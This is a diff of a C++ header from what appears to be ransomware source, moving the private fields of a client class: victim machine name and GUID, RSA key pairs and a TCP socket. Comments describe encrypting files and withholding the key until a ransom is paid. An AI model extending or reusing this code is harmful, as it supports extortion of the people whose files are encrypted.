@@ -32,13 +32,6 @@ public:
     void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
 
-private:
-    std::string        m_ComputerName   = "";       // remote host computer name. e.g DESKTOP-AJDU31S
-    std::string        m_MachineGUID    = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
-    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
-    RSAKeys            m_RansomSecrets  = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
-    SOCKET             m_TCPSocket      = INVALID_SOCKET;
-
 #ifdef CLIENT_RELEASE                               // Client only methods
 public:
     Client();
@@ -86,4 +79,11 @@ public:
     RSA*               ClientPublicKey = {};
     BOOL               ExpectingResponse = FALSE;
 #endif
+
+private:
+    std::string        m_ComputerName = "";       // remote host computer name. e.g DESKTOP-AJDU31S
+    std::string        m_MachineGUID = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
+    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
+    RSAKeys            m_RansomSecrets = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
+    SOCKET             m_TCPSocket = INVALID_SOCKET;
 };
